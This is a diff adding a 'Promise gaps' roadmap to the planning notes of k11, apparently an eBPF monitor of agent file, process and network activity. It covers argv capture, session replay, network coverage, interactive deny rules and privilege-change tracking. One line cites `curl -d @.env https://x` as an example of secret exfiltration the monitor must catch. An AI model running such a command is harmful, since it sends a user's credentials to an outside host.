@@ -10,6 +10,20 @@ no action planned).
 
 ---
 
+## Promise gaps (2026-11-04)
+
+What stands between k11 today and "every file, process, network and socket action", and between a recorder and something people keep open. Little Snitch is the model for the second: it shows what an app reaches as it happens and turns an answer into a rule.
+
+- [x] **Command lines.** Exec records named the binary only: `curl -d @.env https://x` was `exec /usr/bin/curl`. The probe now reads argv from the new image (`mm->arg_start..arg_end`, offsets from BTF) into a record built in the ring, up to 1 KB, and says when it cut. Event lines name the binary exec found, then the arguments, so argv[0] cannot pose as another program; OCSF carries `process.cmd_line`; the dashboard shows it per process; processes already running when watched take theirs from /proc.
+- [ ] **`k11 report`**: open a past session from the OCSF log, in the terminal and the dashboard. The record exists; k11 cannot replay it.
+- [ ] **Inbound and connectionless network**: `accept`, `sendto`/`sendmsg` destinations, bytes sent.
+- [ ] **Tell, then ask.** A notice when an agent reaches a host it never reached, or touches a sensitive file; one answer turns it into a rule (deny that host or path from now on). Hosts need a `socket_connect` deny next to `file_open`.
+- [ ] **Control that survives a reload**: today only the tab `k11` opened can change anything.
+- [ ] **Privilege and escape**: setuid and capabilities changes, `unshare`, `setns`, `mount`, `bpf`, module loading, `kill`.
+- [ ] **Housekeeping**: `store.rs` is 1,100 lines; this file mixes old audits, the plan and limitations.
+
+---
+
 ## Audit (2026-11-02)
 
 Full pass over probe, daemon, proto, dashboard, build and packaging.
